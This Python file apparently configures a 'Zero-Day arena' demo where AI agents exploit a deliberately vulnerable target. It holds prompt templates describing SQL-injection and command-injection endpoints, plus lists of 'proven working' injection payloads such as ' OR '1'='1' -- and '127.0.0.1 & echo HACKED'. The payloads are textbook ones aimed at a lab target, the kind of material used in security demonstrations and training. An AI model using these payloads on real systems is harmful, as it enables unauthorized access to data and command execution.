"""Exact attack surface for the Zero-Day arena — keeps agents on-target."""

import os

ATTACK_SURFACE: dict[str, str] = {
    "sqli": """
TARGET ARCHITECTURE (read carefully):
- Endpoint: POST {base}/login
- Content-Type: application/json
- Body format: {{"username": "<YOUR_PAYLOAD_HERE>", "password": "x"}}
- The username string is concatenated into raw SQL:
  SELECT * FROM users WHERE username='<PAYLOAD>' AND password='x'
- There is NO "id=" parameter. Do NOT send URL query strings or form field names.
- Password field is fixed to "x" by the exploit tool — only craft the username value.
- Success JSON contains user rows with keys: admin, alice, supersecret, or a "users" array.
- Proven working examples for this exact target:
  ' OR '1'='1' --
  ' OR 1=1--
  ' OR 1=1/*
  admin'--
""",
    "cmdi": """
TARGET ARCHITECTURE (read carefully):
- Endpoint: POST {base}/ping
- Content-Type: application/json
- Body format: {{"host": "<YOUR_PAYLOAD_HERE>"}}
- The host string is passed to: ping -c 1 <PAYLOAD>  (Linux/Docker) or ping -n 1 <PAYLOAD> (Windows)
- Inject with shell metacharacters: & or | followed by a command.
- There is NO "id=" or "host=" prefix in the payload — only the host value.
- Success output contains HACKED or ping statistics (PING, bytes, TTL).
- Proven working examples:
  127.0.0.1 & echo HACKED
  127.0.0.1 | echo HACKED
""",
}

# Attempt 1 = benign probe (fails — better demo pacing). Attempts 2–4 = real exploits.
DECOY_PAYLOADS: dict[str, str] = {
    "sqli": "guest",
    "cmdi": "127.0.0.1",
}

BREACH_SEEDS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1' --",
        "' OR 1=1--",
        "' OR 1=1/*",
        "admin'--",
    ],
    "cmdi": [
        "127.0.0.1 & echo HACKED",
        "127.0.0.1 | echo HACKED",
        "127.0.0.1&&echo HACKED",
        "localhost & echo HACKED",
    ],
}


def get_attack_surface(vuln_type: str, target_url: str) -> str:
    template = ATTACK_SURFACE.get(vuln_type, "Unknown vulnerability type.")
    return template.replace("{base}", target_url.rstrip("/"))


def get_seed_payload(vuln_type: str, attempt: int) -> str:
    if attempt <= 1:
        return DECOY_PAYLOADS.get(vuln_type, "guest")

    seeds = BREACH_SEEDS.get(vuln_type, [])
    if not seeds:
        return ""
    return seeds[(attempt - 2) % len(seeds)]


def is_fast_scan() -> bool:
    return os.getenv("SCAN_FAST_MODE", "false").strip().lower() in (
        "1",
        "true",
        "yes",
    )
